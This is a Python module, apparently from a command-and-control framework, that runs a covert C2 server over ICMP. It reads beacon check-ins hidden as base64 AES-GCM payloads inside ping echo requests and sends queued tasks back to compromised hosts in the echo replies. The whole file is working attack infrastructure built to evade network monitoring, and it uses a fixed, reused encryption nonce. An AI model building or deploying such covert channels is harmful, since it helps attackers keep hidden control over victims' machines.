# File: modules/icmp_c2.py

"""
ICMP‑based C2 channel: beacons send ICMP echo requests with base64(AES‑GCM payload) in payload.
Server replies with ICMP echo reply containing next task.

Requirements: raw socket privileges (CAP_NET_RAW or run as root).
"""

import socket
import threading
import base64
import json
import struct
import time
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import logging

logger = logging.getLogger("icmp_c2")

# AES‑GCM key and IV from config
AES_KEY = bytes.fromhex(os.getenv("ICMP_AES_KEY", "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"))
AES_IV = bytes.fromhex(os.getenv("ICMP_AES_IV", "0102030405060708090a0b0c"))[:12]

TASKS = {}     # { beacon_id: [ { "task": ..., "sent": False }, ... ] }
TASK_LOCK = threading.Lock()

def _compute_checksum(pkt: bytes) -> int:
    """Compute ICMP checksum."""
    if len(pkt) % 2:
        pkt += b'\x00'
    s = 0
    for i in range(0, len(pkt), 2):
        w = pkt[i] << 8 | pkt[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def start_icmp_server():
    """
    Listens for ICMP echo requests, decrypts payload, registers beacon,
    and replies with next encrypted task (if any).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind(("", 0))
    logger.info("[ICMP_C2] Listening on raw ICMP socket...")

    while True:
        pkt, addr = sock.recvfrom(65535)
        ip_header = pkt[:20]
        icmp_header = pkt[20:28]
        icmp_type, icmp_code, chksum, pkt_id, seq = struct.unpack("!BBHHH", icmp_header)
        if icmp_type != 8:  # Not echo request
            continue

        # Extract payload (rest of packet)
        data = pkt[28:]
        try:
            raw = base64.b64decode(data)
            aesgcm = AESGCM(AES_KEY)
            pt = aesgcm.decrypt(AES_IV, raw, None).decode()
            info = json.loads(pt)
            bid = info.get("id")
            logger.info(f"[ICMP_C2] Beacon {bid} checked in from {addr[0]}: {info}")
            # Record beacon
            with TASK_LOCK:
                TASKS.setdefault(bid, [])
                # Find next unsent task
                next_task = None
                for entry in TASKS[bid]:
                    if not entry["sent"]:
                        next_task = entry["task"]
                        entry["sent"] = True
                        break
            if next_task:
                ct = AESGCM(AES_KEY).encrypt(AES_IV, json.dumps(next_task).encode(), None)
                payload = base64.b64encode(ct)
            else:
                payload = b""
        except Exception as e:
            logger.warning(f"[ICMP_C2] Failed to parse beacon payload: {e}")
            payload = b""

        # Build ICMP echo reply
        reply_type = 0
        reply_code = 0
        checksum = 0
        reply_header = struct.pack("!BBHHH", reply_type, reply_code, checksum, pkt_id, seq)
        reply_pkt = reply_header + payload
        checksum = _compute_checksum(reply_pkt)
        reply_header = struct.pack("!BBHHH", reply_type, reply_code, checksum, pkt_id, seq)
        reply_pkt = reply_header + payload

        # Prepend IP header? No, raw socket will wrap properly if using sendto.
        sock.sendto(reply_pkt, (addr[0], 0))

def add_icmp_task(bid: str, task: dict):
    """
    Adds a task for the given beacon ID. The next time the beacon checks in via ICMP,
    it will receive this task.
    """
    with TASK_LOCK:
        TASKS.setdefault(bid, []).append({"task": task, "sent": False})
    logger.info(f"[ICMP_C2] Added ICMP task for {bid}: {task}")
